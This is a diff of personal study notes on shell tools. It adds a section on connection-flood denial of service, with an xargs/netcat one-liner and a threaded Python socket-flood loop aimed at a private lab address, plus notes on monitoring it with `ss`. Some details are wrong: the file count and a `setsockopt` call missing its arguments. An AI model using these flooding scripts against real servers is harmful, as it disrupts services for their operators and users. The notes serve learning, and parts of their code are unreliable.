@@ -91,5 +91,31 @@ This can simply be done by netcatting to a resource because it makes a TCP conne
 - `xargs`. Useful for programs which won't read from standard input. See [summary video](https://www.youtube.com/watch?v=rp7jLi_kgPg). But in essence:
 	- `seq 50 | echo` (does nothing because echo doesn't read from stdin)
 	- `seq 50 | xargs echo` (will echo 1 - 50)
-	- use `-I SYMBOL` to do something with that input eg. `seq 50 | xargs -I {} touch {}.txt` (makes `1.txt` through 150.txt`). the symbol can be anything, but `{}` is just standard choice.
+	- use `-I SYMBOL` to do something with that input eg. `seq 50 | xargs -I {} touch {}.txt` (makes `1.txt` through `150.txt`). the symbol can be anything, but `{}` is just standard choice.
 	- how to DOS with xargs: `seq 50 | xargs -P 50 -I {} nc 10.0.0.2 1337` (`-P` sets the number of parallel processes)
+
+The problem with using `xargs` and netcalt is that you're opening program resources on your end so it boils down to who has more resources. Often a personal computer will lost against a server. A simple socket connection will take resources but not too many compared to spawning a new program like netcat. It can be done with multiprocessing or multithreading (it turns out multithreading has a higher upper limit) as follows:
+```python
+import socket
+#from multiprocessing import Process
+import threading
+
+def connect():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("10.0.0.2",31337))
+        s.setsockopt(socket.SO_KEEPALIVE)
+    except:
+        pass
+
+while True:
+    t = threading.Thread(target=connect)
+    t.start()
+    #p = Process(target=connect)
+    #p.start()
+```
+
+How to know this that multithreading is more effective than multiprocessing? Monitor using `ss` (socket statistics)
+`watch -n 0.1 ss -s` will monitor and update every 0.1 seconds. multithreading topped off around 1200 connections while multiprocessing barely made 100. Why? a process in python spins up an entirely separate python interpretor. This is large RAM overhead. Threads share the same memory space and spawning a new one takes up very little memory and it occurs quickly. 
+
+
